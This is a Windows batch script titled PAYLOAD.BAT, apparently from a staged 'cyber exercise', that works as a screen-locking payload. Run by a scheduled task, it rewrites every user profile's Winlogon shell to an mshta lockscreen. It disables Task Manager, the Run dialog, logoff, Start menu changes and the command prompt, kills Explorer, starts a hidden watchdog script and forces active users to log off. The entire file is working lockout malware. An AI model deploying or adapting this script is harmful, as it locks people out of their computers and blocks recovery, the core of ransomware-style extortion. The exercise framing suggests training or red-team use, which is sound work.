@echo off
REM ================================================================
REM PAYLOAD.BAT - Lockout script (runs at 14:30 via scheduled task)
REM Locks registry, kills explorer, starts watchdog + lockscreen
REM ================================================================

REM --- Lock all user registries ---
for /f "tokens=*" %%s in ('reg query HKU 2^>nul ^| findstr /i "S-1-5-21" ^| findstr /v "_Classes"') do (
    reg add "%%s\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "mshta.exe C:\CyberExercise\lockscreen.hta" /f >nul 2>&1
    reg add "%%s\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "%%s\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "%%s\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "%%s\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "%%s\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
)

REM --- Kill explorer ---
taskkill /f /im explorer.exe >nul 2>&1

REM --- Start watchdog (hidden) ---
start "" /b wscript.exe "C:\CyberExercise\watchdog.vbs"

REM --- Launch lockscreen ---
start "" mshta.exe "C:\CyberExercise\lockscreen.hta"

REM --- Force logoff all users (so shell replacement takes effect on re-login) ---
for /f "tokens=3" %%i in ('query user 2^>nul ^| findstr /i "Active Actif"') do (
    logoff %%i >nul 2>&1
)
